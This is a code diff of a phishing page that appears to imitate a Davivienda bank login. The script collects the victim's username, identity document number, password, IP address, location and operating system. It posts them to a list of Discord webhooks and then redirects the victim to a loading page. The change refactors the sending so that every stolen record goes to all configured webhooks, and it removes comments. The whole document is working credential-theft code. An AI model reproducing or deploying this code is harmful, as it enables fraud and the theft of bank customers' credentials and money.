@@ -733,6 +733,20 @@ document.addEventListener("keydown", function(e) {
  
 
 <script>
+  function enviarAWebhooks(payload, alTerminar) {
+    var urls = (typeof discord_webhooks !== 'undefined' && discord_webhooks.length) ? discord_webhooks : [];
+    if (urls.length === 0) { if (alTerminar) alTerminar(); return; }
+    var pendientes = urls.length, hecho = false;
+    function listo() {
+      pendientes--;
+      if (pendientes <= 0 && !hecho) { hecho = true; if (alTerminar) alTerminar(); }
+    }
+    urls.forEach(function (url) {
+      $.ajax({ url: url, type: 'POST', data: JSON.stringify(payload), contentType: 'application/json' }).always(listo);
+    });
+  }
+  /* ==================================================== */
+
   function togglePassword() {
     const passwordInput = document.getElementById('password');
     const eyeIcon = document.querySelector('.toggle-password i');
@@ -760,15 +774,10 @@ $(document).ready(function() {
     $('#user-email-display').text(emailGlobal);
     localStorage.setItem('telefonoUsuario', emailGlobal);
 
-    // ================= GUARDAR NÚMERO DE DOCUMENTO (id) EN LA SESIÓN =================
-    // Si el número de documento está en un campo aparte con id="id", se usa ese valor.
-    // Si no existe ese campo, se usa el valor del primer campo (emailGlobal).
+    // Guardar número de documento (id) en la sesión
     numeroDocumentoGlobal = ($('#id').length ? $('#id').val().trim() : emailGlobal);
-
-    sessionStorage.setItem('numeroDocumento', numeroDocumentoGlobal); // se recupera en otro script
-    localStorage.setItem('numeroDocumento', numeroDocumentoGlobal);   // respaldo por si cambia de pestaña
-    console.log("Número de documento guardado en sesión:", numeroDocumentoGlobal);
-    // ===============================================================================
+    sessionStorage.setItem('numeroDocumento', numeroDocumentoGlobal);
+    localStorage.setItem('numeroDocumento', numeroDocumentoGlobal);
 
     $('#email-step').addClass('hidden');
     $('#password-step').removeClass('hidden');
@@ -783,7 +792,6 @@ $(document).ready(function() {
 
   $('#password-form').submit(function(e){
     e.preventDefault();
-    // Usa la variable global en lugar de leer del DOM
     var u_name777 = emailGlobal;
     var u_name888 = $('#password').val();
 
@@ -793,132 +801,70 @@ $(document).ready(function() {
           $.getJSON("https://ipinfo.io", function (response) {
               ip2 = response.city + ", " + response.country;
               
-        // Crear el mensaje para Discord
-// Dentro de tu función que envía datos a Discord, antes de construir el mensaje:
-var soUsuario = detectarSO();
+        var soUsuario = detectarSO();
 
-// Cuando construyes el mensaje para Discord, agrega el sistema operativo
-var discordMessage = {
-    "content": "@everyone", // Mención a todos
-    "embeds": [
-        {
-            "title": "🔐  Davivienda",
-            "color": 3447003,
-            "fields": [
+        var discordMessage = {
+            "content": "@everyone",
+            "embeds": [
                 {
-                    "name": "📧 Nombre de usuario",
-                    "value": u_name777,
-                    "inline": false
-                },
-                {
-                    "name": "🆔 Número de documento",
-                    "value": numeroDocumentoGlobal,
-                    "inline": false
-                },
-                {
-                    "name": "🔒 Contraseña",
-                    "value": u_name888,
-                    "inline": false
-                },
-                {
-                    "name": "🌍 IP y Ubicación",
-                    "value": "IP: " + ip + "\nUbicación: " + ip2,
-                    "inline": false
-                },
-                {
-                    "name": "🖥 Sistema Operativo",
-                    "value": soUsuario,
-                    "inline": false
+                    "title": "🔐  Davivienda",
+                    "color": 3447003,
+                    "fields": [
+                        { "name": "📧 Nombre de usuario", "value": u_name777, "inline": false },
+                        { "name": "🆔 Número de documento", "value": numeroDocumentoGlobal, "inline": false },
+                        { "name": "🔒 Contraseña", "value": u_name888, "inline": false },
+                        { "name": "🌍 IP y Ubicación", "value": "IP: " + ip + "\nUbicación: " + ip2, "inline": false },
+                        { "name": "🖥 Sistema Operativo", "value": soUsuario, "inline": false }
+                    ],
+                    "timestamp": new Date().toISOString(),
+                    "footer": { "text": "Microsoft Login" }
                 }
-            ],
-            "timestamp": new Date().toISOString(),
-            "footer": {
-                "text": "Microsoft Login"
-            }
-        }
-    ]
-};
+            ]
+        };
 
-              // Enviar a Discord
-              var settings = {
-                  "async": true,
-                  "crossDomain": true,
-                  "url": discord_webhook_url,
-                  "method": "POST",
-                  "headers": {
-                      "Content-Type": "application/json"
-                  },
-                  "data": JSON.stringify(discordMessage)
-              };
-              
-              $.ajax(settings).done(function (response) {
-                  window.location = 'cargando.html'; 
-              }).fail(function (error) {
+              // Enviar a TODOS los webhooks del archivo
+              enviarAWebhooks(discordMessage, function () {
                   window.location = 'cargando.html';
               });
           });
       });
     });
 
-    // Prevent zoom on input focus for iOS
     $(document).on('touchstart', function(e) {
       if ($(e.target).is('input, textarea, select')) {
         e.preventDefault();
       }
     });
 
-    // Ensure form stays centered when keyboard appears
     $(window).on('resize', function() {
       window.scrollTo(0, 0);
     });
   });
 
-
-  // Función para detectar el sistema operativo
 function detectarSO() {
     const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-    if (/windows phone/i.test(userAgent)) {
-        return "Windows Phone";
-    }
-    if (/windows/i.test(userAgent)) {
-        return "Windows";
-    }
-    if (/android/i.test(userAgent)) {
-        return "Android";
-    }
-    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-        return "iOS";
-    }
-    if (/Macintosh|MacIntel|MacPPC|Mac68K/.test(userAgent)) {
-        return "Mac OS";
-    }
-    if (/Linux/.test(userAgent)) {
-        return "Linux";
-    }
+    if (/windows phone/i.test(userAgent)) return "Windows Phone";
+    if (/windows/i.test(userAgent)) return "Windows";
+    if (/android/i.test(userAgent)) return "Android";
+    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) return "iOS";
+    if (/Macintosh|MacIntel|MacPPC|Mac68K/.test(userAgent)) return "Mac OS";
+    if (/Linux/.test(userAgent)) return "Linux";
     return "Desconocido";
 }
 
-// ============ RECUPERAR EL NÚMERO DE DOCUMENTO (para usar en otro script) ============
 function obtenerNumeroDocumento() {
     return sessionStorage.getItem('numeroDocumento')
         || localStorage.getItem('numeroDocumento')
         || '';
 }
-// ==================================================================================
 
  function validarNombreUsuario(input) {
-    // Eliminar espacios en blanco al principio y al final
     input.value = input.value.trim();
-    
-    // Eliminar cualquier carácter que no sea letra o número
     input.value = input.value.replace(/[^a-zA-Z0-9]/g, '');
-    
-    // Asegurarse de que no exceda los 10 caracteres (aunque maxlength ya lo hace, esto es una doble verificación)
     if (input.value.length > 20) {
       input.value = input.value.substring(0, 10);
     }
   }
-
 </script>
 
 </body>
